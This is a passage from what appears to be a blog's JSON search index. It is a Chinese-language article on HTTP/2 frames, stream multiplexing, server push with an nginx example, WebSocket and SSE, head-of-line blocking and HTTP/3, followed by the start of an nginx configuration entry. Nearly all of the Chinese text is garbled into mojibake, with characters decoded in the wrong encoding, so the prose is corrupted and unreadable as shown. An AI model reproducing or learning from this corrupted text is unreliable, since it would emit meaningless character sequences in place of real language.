åˆ™æ˜¯ä¸€ä¸ªå½»åº•çš„äºŒè¿›åˆ¶åè®®ï¼Œå¤´ä¿¡æ¯å’Œæ•°æ®ä½“éƒ½æ˜¯äºŒè¿›åˆ¶ï¼Œå¹¶ä¸”ç»Ÿç§°ä¸º\"å¸§\"ï¼ˆframeï¼‰ï¼šå¤´ä¿¡æ¯å¸§å’Œæ•°æ®å¸§ã€‚\n\nä½ å¯ä»¥ä»ä¸‹å›¾çœ‹åˆ°ï¼ŒHTTP/1.1 çš„å“åº” å’Œ HTTP/2 çš„åŒºåˆ«ï¼š\n\n<img src=\"http2çš„å˜åŒ–å’ŒåŒºåˆ«/1.jpg\" alt=\"1\" style=\"zoom:67%;\" />\n\n\nHTTP/2 æŠŠå“åº”æŠ¥æ–‡åˆ’åˆ†æˆäº†ä¸¤ä¸ªå¸§ï¼ˆFrameï¼‰ï¼Œå›¾ä¸­çš„ HEADERSï¼ˆé¦–éƒ¨ï¼‰å’Œ DATAï¼ˆæ¶ˆæ¯è´Ÿè½½ï¼‰ æ˜¯å¸§çš„ç±»å‹ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸€æ¡ HTTP å“åº”ï¼Œåˆ’åˆ†æˆäº†ä¸¤ä¸ªå¸§æ¥ä¼ è¾“ï¼Œå¹¶ä¸”é‡‡ç”¨äºŒè¿›åˆ¶æ¥ç¼–ç ã€‚\n\nHTTP/2 äºŒè¿›åˆ¶å¸§çš„ç»“æ„å¦‚ä¸‹å›¾ï¼š\n\n<img src=\"http2çš„å˜åŒ–å’ŒåŒºåˆ«/v2-bdb8061166cf5137f3f8559f53ebdfbd_1440w.jpg\" alt=\"img\" style=\"zoom:77%;\" />\n\nå¸§å¤´ï¼ˆFream Headerï¼‰å¾ˆå°ï¼Œåªæœ‰ 9 ä¸ªå­—èŠ‚ï¼Œå¸§å¼€å¤´çš„å‰ 3 ä¸ªå­—èŠ‚è¡¨ç¤ºå¸§æ•°æ®ï¼ˆFream Playloadï¼‰çš„**é•¿åº¦**ã€‚\n\nå¸§é•¿åº¦åé¢çš„ä¸€ä¸ªå­—èŠ‚æ˜¯è¡¨ç¤ºå¸§çš„ç±»å‹ï¼ŒHTTP/2 æ€»å…±å®šä¹‰äº† 10 ç§ç±»å‹çš„å¸§ï¼Œä¸€èˆ¬åˆ†ä¸ºæ•°æ®å¸§å’Œæ§åˆ¶å¸§ä¸¤ç±»ï¼Œå¦‚ä¸‹è¡¨æ ¼ï¼š\n\n<img src=\"http2çš„å˜åŒ–å’ŒåŒºåˆ«/v2-e2938c27e41042382cd86684e392d30f_1440w.jpg\" alt=\"img\" style=\"zoom:67%;\" />\n\nå¸§ç±»å‹åé¢çš„ä¸€ä¸ªå­—èŠ‚æ˜¯æ ‡å¿—ä½ï¼Œå¯ä»¥ä¿å­˜ 8 ä¸ªæ ‡å¿—ä½ï¼Œç”¨äºæºå¸¦ç®€å•çš„æ§åˆ¶ä¿¡æ¯ï¼Œæ¯”å¦‚ï¼š\n\n- END_HEADERS è¡¨ç¤ºå¤´æ•°æ®ç»“æŸæ ‡å¿—ï¼Œç›¸å½“äº HTTP/1 é‡Œå¤´åçš„ç©ºè¡Œï¼ˆâ€œ\\r\\nâ€ï¼‰ï¼›\n- END_STREAM è¡¨ç¤ºå•æ–¹å‘æ•°æ®å‘é€ç»“æŸï¼Œåç»­ä¸ä¼šå†æœ‰æ•°æ®å¸§ã€‚\n- PRIORITY è¡¨ç¤ºæµçš„ä¼˜å…ˆçº§ï¼›\n\nå¸§å¤´çš„æœ€å 4 ä¸ªå­—èŠ‚æ˜¯æµæ ‡è¯†ç¬¦ï¼ˆStream IDï¼‰ï¼Œä½†æœ€é«˜ä½è¢«ä¿ç•™ä¸ç”¨ï¼Œåªæœ‰ 31 ä½å¯ä»¥ä½¿ç”¨ï¼Œå› æ­¤æµæ ‡è¯†ç¬¦çš„æœ€å¤§å€¼æ˜¯ 2^31ï¼Œå¤§çº¦æ˜¯ 21 äº¿ï¼Œå®ƒçš„ä½œç”¨æ˜¯ç”¨æ¥æ ‡è¯†è¯¥ Fream å±äºå“ªä¸ª Streamï¼Œæ¥æ”¶æ–¹å¯ä»¥æ ¹æ®è¿™ä¸ªä¿¡æ¯ä»ä¹±åºçš„å¸§é‡Œæ‰¾åˆ°ç›¸åŒ Stream ID çš„å¸§ï¼Œä»è€Œæœ‰åºç»„è£…ä¿¡æ¯ã€‚\n\næœ€åé¢å°±æ˜¯å¸§æ•°æ®äº†ï¼Œå®ƒå­˜æ”¾çš„æ˜¯é€šè¿‡ HPACK ç®—æ³•å‹ç¼©è¿‡çš„ HTTP å¤´éƒ¨å’ŒåŒ…ä½“ã€‚\n\n\n\n### 2.3 Streamå¹¶å‘ä¼ è¾“\n\næˆ‘ä»¬éƒ½çŸ¥é“ HTTP/1.1 çš„å®ç°æ˜¯åŸºäºè¯·æ±‚-å“åº”æ¨¡å‹çš„ã€‚åŒä¸€ä¸ªè¿æ¥ä¸­ï¼ŒHTTP å®Œæˆä¸€ä¸ªäº‹åŠ¡ï¼ˆè¯·æ±‚ä¸å“åº”ï¼‰ï¼Œæ‰èƒ½å¤„ç†ä¸‹ä¸€ä¸ªäº‹åŠ¡ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨å‘å‡ºè¯·æ±‚ç­‰å¾…å“åº”çš„è¿‡ç¨‹ä¸­ï¼Œæ˜¯æ²¡åŠæ³•åšå…¶ä»–äº‹æƒ…çš„ï¼Œå¦‚æœå“åº”è¿Ÿè¿Ÿä¸æ¥ï¼Œé‚£ä¹ˆåç»­çš„è¯·æ±‚æ˜¯æ— æ³•å‘é€çš„ï¼Œä¹Ÿé€ æˆäº†é˜Ÿå¤´é˜»å¡çš„é—®é¢˜ã€‚\n\nè€Œ HTTP/2 é€šè¿‡ Stream è¿™ä¸ªè®¾è®¡ï¼Œå¤šä¸ª Stream å¤ç”¨ä¸€æ¡ TCP è¿æ¥ï¼Œè¾¾åˆ°å¹¶å‘çš„æ•ˆæœï¼Œè§£å†³äº† HTTP/1.1 é˜Ÿå¤´é˜»å¡çš„é—®é¢˜ï¼Œæé«˜äº† HTTP ä¼ è¾“çš„ååé‡ã€‚\n\n![img](http2çš„å˜åŒ–å’ŒåŒºåˆ«/v2-5ee4f92e3579000821f2ffe0babb3cc8_1440w.jpg)\n\n\n\nå¯ä»¥ä»ä¸Šå›¾ä¸­çœ‹åˆ°ï¼š\n\n- 1 ä¸ª TCP è¿æ¥åŒ…å«ä¸€ä¸ªæˆ–è€…å¤šä¸ª Streamï¼ŒStream æ˜¯ HTTP/2 å¹¶å‘çš„å…³é”®æŠ€æœ¯ï¼›\n- Stream é‡Œå¯ä»¥åŒ…å« 1 ä¸ªæˆ–å¤šä¸ª Messageï¼ŒMessage å¯¹åº” HTTP/1 ä¸­çš„è¯·æ±‚æˆ–å“åº”ï¼Œç”± HTTP å¤´éƒ¨å’ŒåŒ…ä½“æ„æˆï¼›\n- Message é‡ŒåŒ…å«ä¸€æ¡æˆ–è€…å¤šä¸ª Frameï¼ŒFrame æ˜¯ HTTP/2 æœ€å°å•ä½ï¼Œä»¥äºŒè¿›åˆ¶å‹ç¼©æ ¼å¼å­˜æ”¾ HTTP/1 ä¸­çš„å†…å®¹ï¼ˆå¤´éƒ¨å’ŒåŒ…ä½“ï¼‰ï¼›\n\n\n\nåœ¨ HTTP/2 è¿æ¥ä¸Šï¼Œä¸åŒ Stream çš„å¸§æ˜¯å¯ä»¥ä¹±åºå‘é€çš„ï¼ˆå› æ­¤å¯ä»¥å¹¶å‘ä¸åŒçš„ Stream ï¼‰ï¼Œå› ä¸ºæ¯ä¸ªå¸§çš„å¤´éƒ¨ä¼šæºå¸¦ Stream ID ä¿¡æ¯ï¼Œæ‰€ä»¥æ¥æ”¶ç«¯å¯ä»¥é€šè¿‡ Stream ID æœ‰åºç»„è£…æˆ HTTP æ¶ˆæ¯ï¼Œè€ŒåŒä¸€ Stream å†…éƒ¨çš„å¸§å¿…é¡»æ˜¯ä¸¥æ ¼æœ‰åºçš„ã€‚\n\n<img src=\"http2çš„å˜åŒ–å’ŒåŒºåˆ«/v2-57da2b01b848cda5d7dbf8decaf6268b_1440w.jpg\" alt=\"img\" style=\"zoom:77%;\" />\n\nå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨åŒæ–¹éƒ½å¯ä»¥å»ºç«‹ Streamï¼Œ Stream ID ä¹Ÿæ˜¯æœ‰åŒºåˆ«çš„ï¼Œå®¢æˆ·ç«¯å»ºç«‹çš„ Stream å¿…é¡»æ˜¯å¥‡æ•°å·ï¼Œè€ŒæœåŠ¡å™¨å»ºç«‹çš„ Stream å¿…é¡»æ˜¯å¶æ•°å·ã€‚\n\nåŒä¸€ä¸ªè¿æ¥ä¸­çš„ Stream ID æ˜¯ä¸èƒ½å¤ç”¨çš„ï¼Œåªèƒ½é¡ºåºé€’å¢ï¼Œæ‰€ä»¥å½“ Stream ID è€—å°½æ—¶ï¼Œéœ€è¦å‘ä¸€ä¸ªæ§åˆ¶å¸§ `GOAWAY`ï¼Œç”¨æ¥å…³é—­ TCP è¿æ¥ã€‚\n\nåœ¨ Nginx ä¸­ï¼Œå¯ä»¥é€šè¿‡ `http2_max_concurrent_streams` é…ç½®æ¥è®¾ç½® Stream çš„ä¸Šé™ï¼Œé»˜è®¤æ˜¯ 128 ä¸ªã€‚\n\n\n\nHTTP/2 é€šè¿‡ Stream å®ç°çš„å¹¶å‘ï¼Œæ¯” HTTP/1.1 é€šè¿‡ TCP è¿æ¥å®ç°å¹¶å‘è¦ç‰›é€¼çš„å¤šï¼Œå› ä¸ºå½“ HTTP/2 å®ç° 100 ä¸ªå¹¶å‘ Stream æ—¶ï¼Œåªéœ€è¦å»ºç«‹ä¸€æ¬¡ TCP è¿æ¥ï¼Œè€Œ HTTP/1.1 éœ€è¦å»ºç«‹ 100 ä¸ª TCP è¿æ¥ï¼Œæ¯ä¸ª TCP è¿æ¥éƒ½è¦ç»è¿‡TCP æ¡æ‰‹ã€æ…¢å¯åŠ¨ä»¥åŠ TLS æ¡æ‰‹è¿‡ç¨‹ï¼Œè¿™äº›éƒ½æ˜¯å¾ˆè€—æ—¶çš„ã€‚\n\nHTTP/2 è¿˜å¯ä»¥å¯¹æ¯ä¸ª Stream è®¾ç½®ä¸åŒä¼˜å…ˆçº§ï¼Œå¸§å¤´ä¸­çš„ã€Œæ ‡å¿—ä½ã€å¯ä»¥è®¾ç½®ä¼˜å…ˆçº§ï¼Œæ¯”å¦‚å®¢æˆ·ç«¯è®¿é—® HTML/CSS å’Œå›¾ç‰‡èµ„æºæ—¶ï¼Œå¸Œæœ›æœåŠ¡å™¨å…ˆä¼ é€’ HTML/CSSï¼Œå†ä¼ å›¾ç‰‡ï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡è®¾ç½® Stream çš„ä¼˜å…ˆçº§æ¥å®ç°ï¼Œä»¥æ­¤æé«˜ç”¨æˆ·ä½“éªŒã€‚\n\n\n\n### 2.4 æœåŠ¡å™¨ä¸»åŠ¨æ¨é€\n\næ¯”å¦‚ï¼Œå®¢æˆ·ç«¯é€šè¿‡ HTTP/1.1 è¯·æ±‚ä»æœåŠ¡å™¨é‚£è·å–åˆ°äº† HTML æ–‡ä»¶ï¼Œè€Œ HTML å¯èƒ½è¿˜éœ€è¦ä¾èµ– CSS æ¥æ¸²æŸ“é¡µé¢ï¼Œè¿™æ—¶å®¢æˆ·ç«¯è¿˜è¦å†å‘èµ·è·å– CSS æ–‡ä»¶çš„è¯·æ±‚ï¼Œéœ€è¦ä¸¤æ¬¡æ¶ˆæ¯å¾€è¿”ï¼Œå¦‚ä¸‹å›¾å·¦è¾¹éƒ¨åˆ†ï¼š\n\n![img](http2çš„å˜åŒ–å’ŒåŒºåˆ«/1.png)\n\nå¦‚ä¸Šå›¾å³è¾¹éƒ¨åˆ†ï¼Œåœ¨ HTTP/2 ä¸­ï¼Œå®¢æˆ·ç«¯åœ¨è®¿é—® HTML æ—¶ï¼ŒæœåŠ¡å™¨å¯ä»¥ç›´æ¥ä¸»åŠ¨æ¨é€ CSS æ–‡ä»¶ï¼Œå‡å°‘äº†æ¶ˆæ¯ä¼ é€’çš„æ¬¡æ•°ã€‚\n\n\n\nåœ¨ Nginx ä¸­ï¼Œå¦‚æœä½ å¸Œæœ›å®¢æˆ·ç«¯è®¿é—® /test.html æ—¶ï¼ŒæœåŠ¡å™¨ç›´æ¥æ¨é€ /test.cssï¼Œé‚£ä¹ˆå¯ä»¥è¿™ä¹ˆé…ç½®ï¼š\n\n```nginx\nlocation /test.html { \n  http2_push /test.css; \n}\n```\n\n**å¦å¤–Server Pushä¸åŒäºWebsocketï¼ŒServer Pushä¸€èˆ¬æ˜¯æŒ‡æœåŠ¡å™¨ä¸»åŠ¨å‘å®¢æˆ·ç«¯æ¨é€æ•°æ®ï¼Œè¿™æ˜¯ä¸€ç§å•å‘çš„ä¸»åŠ¨æ¨é€ï¼Œè€ŒWebSocketæ˜¯åŒå‘çš„ï¼Œè¿™ä¸¤ç§æŠ€æœ¯ä¸æ˜¯ç«äº‰å…³ç³»ã€‚**\n\nServer Pushå¯ä»¥ç”¨åœ¨æœåŠ¡å™¨ä¸»åŠ¨å‘å®¢æˆ·ç«¯æ¨é€é™æ€èµ„æºï¼Œæ¯”å¦‚æµè§ˆå™¨è¯·æ±‚index.htmlæ—¶ï¼ŒæœåŠ¡å™¨é™¤äº†è¿”å›ç½‘é¡µå†…å®¹å¤–ï¼Œè¿˜ä¼šå°†index.htmlé¡µé¢é‡Œé¢çš„å„ç§csså’Œjsä¸€èµ·æ¨é€åˆ°æµè§ˆå™¨ç¼“å­˜èµ·æ¥ï¼Œå½“æµè§ˆå™¨åˆ†æäº†ç½‘é¡µå†…å®¹å‘ç°é™æ€èµ„æºæ—¶ï¼Œä¸éœ€è¦å†å»æœåŠ¡å™¨è¯·æ±‚ä¸€æ¬¡ï¼Œå®ƒåªéœ€è¦ä»ç¼“å­˜é‡Œç›´æ¥æ‹¿å°±å¯ä»¥äº†ã€‚ä¸è¿‡ç°ä»£çš„ç½‘ç«™çš„é™æ€èµ„æºå¤§å¤šéƒ½æ˜¯CDNæ¶æ„çš„ï¼Œé™æ€èµ„æºéƒ½åœ¨ç¬¬ä¸‰æ–¹æœåŠ¡å™¨ï¼ŒServer Pushåœ¨è¿™æ–¹é¢ä½œç”¨å¹¶ä¸å¤§ã€‚\n\n\n\n# 3. é•¿è¿æ¥åŒºåˆ«\n\n### 3.1 websocket\n\nWebSocketæ˜¯å…¨åŒå·¥çš„ï¼Œå¯ä»¥åŒå‘é€šä¿¡ï¼Œä¸»è¦åº”ç”¨åœ¨å®æ—¶é€šä¿¡çš„åœºæ™¯ä¸­ï¼ŒæœåŠ¡å™¨å¯ä»¥å®æ—¶æ¨é€æ•°æ®ç»™å®¢æˆ·ç«¯ã€‚\n\n### 3.2 SSE æŠ€æœ¯\n\nSSE ï¼ˆ Server-sent Events ï¼‰æ˜¯ WebSocket çš„ä¸€ç§è½»é‡ä»£æ›¿æ–¹æ¡ˆï¼Œä½¿ç”¨ HTTP åè®®ã€‚ä¸¥æ ¼åœ°è¯´ï¼ŒHTTP åè®®æ˜¯æ²¡æœ‰åŠæ³•åšæœåŠ¡å™¨æ¨é€çš„ï¼Œä½†æ˜¯å½“æœåŠ¡å™¨å‘å®¢æˆ·ç«¯å£°æ˜æ¥ä¸‹æ¥è¦å‘é€æµä¿¡æ¯æ—¶ï¼Œå®¢æˆ·ç«¯å°±ä¼šä¿æŒè¿æ¥æ‰“å¼€ï¼ŒSSE ä½¿ç”¨çš„å°±æ˜¯è¿™ç§åŸç†ã€‚\n\nSSE æ˜¯å•å‘é€šé“ï¼Œåªèƒ½æœåŠ¡å™¨å‘å®¢æˆ·ç«¯å‘é€æ¶ˆæ¯ï¼Œå¦‚æœå®¢æˆ·ç«¯éœ€è¦å‘æœåŠ¡å™¨å‘é€æ¶ˆæ¯ï¼Œåˆ™éœ€è¦ä¸€ä¸ªæ–°çš„ HTTP è¯·æ±‚ã€‚ è¿™å¯¹æ¯” WebSocket çš„åŒå·¥é€šé“æ¥è¯´ï¼Œä¼šæœ‰æ›´å¤§çš„å¼€é”€ã€‚\n\n### 3.3 http2 \n\nHTTP/2 è™½ç„¶ä¹Ÿæ”¯æŒ Server Pushï¼Œä½†æ˜¯æœåŠ¡å™¨åªèƒ½ä¸»åŠ¨å°†èµ„æºæ¨é€åˆ°å®¢æˆ·ç«¯ç¼“å­˜ï¼é‚£ä¸æ˜¯åº”ç”¨ç¨‹åºå¯ä»¥æ„ŸçŸ¥çš„ï¼Œä¸»è¦æ˜¯è®©æµè§ˆå™¨ï¼ˆç”¨æˆ·ä»£ç†ï¼‰æå‰ç¼“å­˜é™æ€èµ„æºã€‚\n\nHTTP/2ä¸æ˜¯ç±»ä¼¼äºWebsocketæˆ–è€…SSEè¿™æ ·çš„æ¨é€æŠ€æœ¯çš„æ›¿ä»£å“ã€‚\n\n\n\n# 4. å¤ç”¨ tcp è¿æ¥\n\n### 4.1 http1 baseline\n\næ‰€è°“é•¿è¿æ¥ï¼Œå³åœ¨ HTTP è¯·æ±‚å»ºç«‹ TCP è¿æ¥æ—¶ï¼Œè¯·æ±‚ç»“æŸï¼ŒTCP è¿æ¥ä¸æ–­å¼€ï¼Œç»§ç»­ä¿æŒä¸€æ®µæ—¶é—´ï¼ˆtimeoutï¼‰ï¼Œåœ¨è¿™æ®µæ—¶é—´å†…ï¼ŒåŒä¸€å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€è¯·æ±‚éƒ½ä¼šå¤ç”¨è¯¥ TCP è¿æ¥ï¼Œå¹¶é‡ç½® timeout æ—¶é—´è®¡æ•°å™¨ï¼Œåœ¨æ¥ä¸‹æ¥ timeout æ—¶é—´å†…è¿˜å¯ä»¥ç»§ç»­å¤ç”¨ TCP ã€‚\n\ntimeout æ—¶é—´åˆ°äº†ä¹‹åï¼ŒTCPä¼šç«‹å³æ–­å¼€è¿æ¥å—ï¼Ÿ\n\nè‹¥ä¸¤å°æ—¶ï¼ˆtimeoutï¼‰æ²¡æœ‰æ”¶åˆ°å®¢æˆ·çš„æ•°æ®ï¼ŒæœåŠ¡å™¨å°±å‘é€ä¸€ä¸ªæ¢æµ‹æŠ¥æ–‡æ®µï¼Œä»¥ååˆ™æ¯éš” 75 ç§’å‘é€ä¸€æ¬¡ã€‚è‹¥ä¸€è¿å‘é€ 10 ä¸ªæ¢æµ‹æŠ¥æ–‡æ®µåä»æ— å®¢æˆ·çš„å“åº”ï¼ŒæœåŠ¡å™¨å°±è®¤ä¸ºå®¢æˆ·ç«¯å‡ºäº†æ•…éšœï¼Œæ¥ç€å°±å…³é—­è¿™ä¸ªè¿æ¥ã€‚\n\n<img src=\"http2çš„å˜åŒ–å’ŒåŒºåˆ«/48abea2a282d4289aa51d361ae8c23fe~tplv-k3u1fbpfcp-zoom-in-crop-mark:1512:0:0:0.awebp\" alt=\"img\" style=\"zoom:40%;\" />\n\nHTTP/1.x è™½ç„¶å¼•å…¥äº† keep-alive é•¿è¿æ¥ï¼Œä½†å®ƒæ¯æ¬¡è¯·æ±‚å¿…é¡»ç­‰å¾…ä¸Šä¸€æ¬¡å“åº”ä¹‹åæ‰èƒ½å‘èµ·ã€‚\n\næ‰€ä»¥ï¼Œåœ¨ HTTP/1.1 ä¸­æå‡ºäº†ç®¡é“æœºåˆ¶ï¼ˆé»˜è®¤ä¸å¼€å¯ï¼‰ï¼Œä¸‹ä¸€æ¬¡çš„è¯·æ±‚ä¸éœ€è¦ç­‰å¾…ä¸Šä¸€ä¸ªå“åº”æ¥ä¹‹åå†å‘é€ï¼Œä½†è¿™è¦æ±‚æœåŠ¡ç«¯å¿…é¡»æŒ‰ç…§è¯·æ±‚å‘é€çš„é¡ºåºè¿”å›å“åº”ï¼Œå½“é¡ºåºè¯·æ±‚å¤šä¸ªæ–‡ä»¶æ—¶ï¼Œå…¶ä¸­ä¸€ä¸ªè¯·æ±‚å› ä¸ºæŸç§åŸå› è¢«é˜»å¡æ—¶ï¼Œåœ¨åé¢æ’é˜Ÿçš„æ‰€æœ‰è¯·æ±‚ä¹Ÿä¸€å¹¶è¢«é˜»å¡ï¼Œè¿™å°±æ˜¯ HTTP é˜Ÿå¤´é˜»å¡ (Head-Of-Line Blocking)ã€‚\n\n### 4.2 http2 multiplex\n\n+ HTTP/1.x æ˜¯åŸºäºæ–‡æœ¬çš„ï¼Œåªèƒ½æ•´ä½“å»ä¼ ï¼›HTTP/2 æ˜¯åŸºäºäºŒè¿›åˆ¶æµçš„ï¼Œå¯ä»¥åˆ†è§£ä¸ºç‹¬ç«‹çš„å¸§ï¼Œäº¤é”™å‘é€\n+ HTTP/1.x keep-alive å¿…é¡»æŒ‰ç…§è¯·æ±‚å‘é€çš„é¡ºåºè¿”å›å“åº”ï¼›HTTP/2 å¤šè·¯å¤ç”¨ä¸æŒ‰åºå“åº”ã€‚\n+ HTTP/1.x keep-alive ä¸ºäº†è§£å†³ http é˜Ÿå¤´é˜»å¡ï¼Œå°†åŒä¸€ä¸ªé¡µé¢çš„èµ„æºåˆ†æ•£åˆ°ä¸åŒåŸŸåä¸‹ï¼Œå¼€å¯äº†å¤šä¸ª TCP è¿æ¥ï¼›HTTP/2 åŒåŸŸåä¸‹æ‰€æœ‰é€šä¿¡éƒ½åœ¨å•ä¸ªè¿æ¥ä¸Šå®Œæˆã€‚\n+ HTTP/1.x keep-alive å•ä¸ª TCP è¿æ¥åœ¨åŒä¸€æ—¶åˆ»åªèƒ½å¤„ç†ä¸€ä¸ªè¯·æ±‚ï¼ˆä¸¤ä¸ªè¯·æ±‚çš„ç”Ÿå‘½å‘¨æœŸä¸èƒ½é‡å ï¼‰ï¼›HTTP/2 å•ä¸ª TCP åŒä¸€æ—¶åˆ»å¯ä»¥å‘é€å¤šä¸ªè¯·æ±‚å’Œå“åº”ã€‚\n\n<img src=\"http2çš„å˜åŒ–å’ŒåŒºåˆ«/bVbck6Y.png\" alt=\"clipboard.png\" style=\"zoom:50%;\" />\n\n# 5. é˜Ÿå¤´é˜»å¡é—®é¢˜\n\nå¾ˆå¤šäººåœ¨ä¸€äº›èµ„æ–™ä¸­ä¼šçœ‹åˆ°æœ‰è®ºç‚¹è¯´HTTP/2è§£å†³äº†é˜Ÿå¤´é˜»å¡çš„é—®é¢˜ã€‚ä½†æ˜¯è¿™å¥è¯åªå¯¹äº†ä¸€åŠã€‚åªèƒ½è¯´HTTP/2è§£å†³äº†HTTPçš„é˜Ÿå¤´é˜»å¡é—®é¢˜ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰è§£å†³TCPé˜Ÿå¤´é˜»å¡é—®é¢˜!\n\n### 5.1 HTTP é˜Ÿå¤´é˜»å¡\n\nhttp1.xé‡‡ç”¨é•¿è¿æ¥(Connection:keep-alive)ï¼Œå¯ä»¥åœ¨ä¸€ä¸ªTCPè¯·æ±‚ä¸Šï¼Œå‘é€å¤šä¸ªhttpè¯·æ±‚ã€‚æœ‰éç®¡é“åŒ–å’Œç®¡é“åŒ–ï¼Œä¸¤ç§æ–¹å¼ã€‚\n\néç®¡é“åŒ–ï¼šå®Œå…¨ä¸²è¡Œæ‰§è¡Œï¼Œè¯·æ±‚->å“åº”->è¯·æ±‚->å“åº”...ï¼Œåä¸€ä¸ªè¯·æ±‚å¿…é¡»åœ¨å‰ä¸€ä¸ªå“åº”ä¹‹åå‘é€ã€‚\n\nç®¡é“åŒ–ï¼šè¯·æ±‚å¯ä»¥å¹¶è¡Œå‘å‡ºï¼Œä½†æ˜¯å“åº”å¿…é¡»ä¸²è¡Œè¿”å›ã€‚åä¸€ä¸ªå“åº”å¿…é¡»åœ¨å‰ä¸€ä¸ªå“åº”ä¹‹åã€‚åŸå› æ˜¯ï¼Œæ²¡æœ‰åºå·æ ‡æ˜é¡ºåºï¼Œåªèƒ½ä¸²è¡Œæ¥æ”¶ã€‚\n\næ— è®ºæ˜¯éç®¡é“åŒ–è¿˜æ˜¯ç®¡é“åŒ–ï¼Œéƒ½ä¼šé€ æˆé˜Ÿå¤´é˜»å¡(è¯·æ±‚é˜»å¡)ã€‚\n\n### 5.2 TCP é˜Ÿå¤´é˜»å¡\n\nTCPæ•°æ®åŒ…æ˜¯æœ‰åºä¼ è¾“ï¼Œä¸­é—´ä¸€ä¸ªæ•°æ®åŒ…ä¸¢å¤±ï¼Œä¼šç­‰å¾…è¯¥æ•°æ®åŒ…é‡ä¼ ï¼Œé€ æˆåé¢çš„æ•°æ®åŒ…çš„é˜»å¡ã€‚\n\n### 5.3 æ€»ç»“\n\nHTTP/1.1çš„ç®¡é“åŒ–æŒä¹…è¿æ¥ä¹Ÿæ˜¯ä½¿å¾—åŒä¸€ä¸ªTCPé“¾æ¥å¯ä»¥è¢«å¤šä¸ªHTTPä½¿ç”¨ï¼Œä½†æ˜¯HTTP/1.1ä¸­è§„å®šä¸€ä¸ªåŸŸåå¯ä»¥æœ‰6ä¸ªTCPè¿æ¥ã€‚\n\nHTTP/2ä½¿ç”¨ä¸€ä¸ªåŸŸåå•ä¸€TCPè¿æ¥å‘é€è¯·æ±‚ï¼Œè¯·æ±‚åŒ…è¢«äºŒè¿›åˆ¶åˆ†å¸§ï¼Œä¸åŒè¯·æ±‚å¯ä»¥äº’ç›¸ç©¿æ’ï¼Œé¿å…äº† http å±‚é¢çš„è¯·æ±‚é˜Ÿå¤´é˜»å¡ã€‚ä½†æ˜¯ä¸èƒ½é¿å…TCPå±‚é¢çš„é˜Ÿå¤´é˜»å¡ã€‚\n\næ‰€ä»¥ï¼Œåœ¨HTTP/2ä¸­ï¼ŒTCPé˜Ÿå¤´é˜»å¡é€ æˆçš„å½±å“ä¼šæ›´å¤§ï¼Œå› ä¸ºHTTP/2çš„å¤šè·¯å¤ç”¨æŠ€æœ¯ä½¿å¾—å¤šä¸ªè¯·æ±‚å…¶å®æ˜¯åŸºäºåŒä¸€ä¸ªTCPè¿æ¥çš„ï¼Œé‚£å¦‚æœæŸä¸€ä¸ªè¯·æ±‚é€ æˆäº†TCPé˜Ÿå¤´é˜»å¡ï¼Œé‚£ä¹ˆå¤šä¸ªè¯·æ±‚éƒ½ä¼šå—åˆ°å½±å“ã€‚\n\n# 6. http3æ˜¯ä»€ä¹ˆ\n\nHTTP/2 ä½¿ç”¨äº†å¤šè·¯å¤ç”¨ï¼Œä¸€èˆ¬æ¥è¯´åŒä¸€åŸŸåä¸‹åªéœ€è¦ä½¿ç”¨ä¸€ä¸ª TCP è¿æ¥ã€‚ä½†å½“è¿™ä¸ªè¿æ¥ä¸­å‡ºç°äº†ä¸¢åŒ…çš„æƒ…å†µï¼Œé‚£å°±ä¼šå¯¼è‡´ HTTP/2 çš„è¡¨ç°æƒ…å†µåå€’ä¸å¦‚ HTTP/1 äº†ã€‚\n\nå› ä¸ºåœ¨å‡ºç°ä¸¢åŒ…çš„æƒ…å†µä¸‹ï¼Œæ•´ä¸ª TCP éƒ½è¦å¼€å§‹ç­‰å¾…é‡ä¼ ï¼Œä¹Ÿå°±å¯¼è‡´äº†åé¢çš„æ‰€æœ‰æ•°æ®éƒ½è¢«é˜»å¡äº†ã€‚ä½†æ˜¯å¯¹äº HTTP/1.1 æ¥è¯´ï¼Œå¯ä»¥å¼€å¯å¤šä¸ª TCP è¿æ¥ï¼Œå‡ºç°è¿™ç§æƒ…å†µååˆ°åªä¼šå½±å“å…¶ä¸­ä¸€ä¸ªè¿æ¥ï¼Œå‰©ä½™çš„ TCP è¿æ¥è¿˜å¯ä»¥æ­£å¸¸ä¼ è¾“æ•°æ®ã€‚\n\nGoogle å°±æ›´èµ·ç‚‰ç¶æäº†ä¸€ä¸ªåŸºäº UDP åè®®çš„ QUIC åè®®ï¼Œå¹¶ä¸”ä½¿ç”¨åœ¨äº† HTTP/3 ä¸Šï¼ŒHTTP/3 ä¹‹å‰åä¸º HTTP-over-QUICï¼Œä»è¿™ä¸ªåå­—ä¸­æˆ‘ä»¬ä¹Ÿå¯ä»¥å‘ç°ï¼ŒHTTP/3 æœ€å¤§çš„æ”¹é€ å°±æ˜¯ä½¿ç”¨äº† QUICã€‚\n\n\n\n# 7. å‚è€ƒèµ„æ–™\n\n+ https://zhuanlan.zhihu.com/p/359920955\n","tags":["http"],"categories":["http"]},{"title":"nginxå¸¸ç”¨æ¨¡å—å’Œé…ç½®å®æˆ˜","url":"%2Fp%2F7245bfc7.html","content":"\nNginxåŠŸèƒ½ä¸°å¯Œï¼Œå¯ä½œä¸ºHTTPæœåŠ¡å™¨ï¼Œä¹Ÿå¯ä½œä¸ºåå‘ä»£ç†æœåŠ¡å™¨ï¼Œé‚®ä»¶æœåŠ¡å™¨ã€‚æ”¯æŒFastCGIã€SSLã€Virtual Hostã€URL Rewriteã€Gzipç­‰åŠŸèƒ½ã€‚å¹¶ä¸”æ”¯æŒå¾ˆå¤šç¬¬ä¸‰æ–¹çš„æ¨¡å—æ‰©å±•ã€‚\n\n\n\n# é›¶. å‰è¨€\n\n### 0.1 é…ç½®æ–‡ä»¶åœ¨å“ª\n\nå®‰è£…å¥½nginxæˆ‘ä»¬é¦–å…ˆè¦çŸ¥é“é…ç½®æ–‡ä»¶åœ¨å“ªé‡Œ?\n\n![1](nginxå¸¸ç”¨æ¨¡å—å’Œé…ç½®å®æˆ˜/1.png)\n\n\n\nè¯´æ˜nginxçš„ä¸»é…ç½®æ–‡ä»¶éƒ½åœ¨ `/etc/nginx/nginx.conf`é‡Œ. æ‰“å¼€æ–‡ä»¶æˆ‘ä»¬è¿˜å¯ä»¥çœ‹åˆ°\n\n```ngnix\ninclude 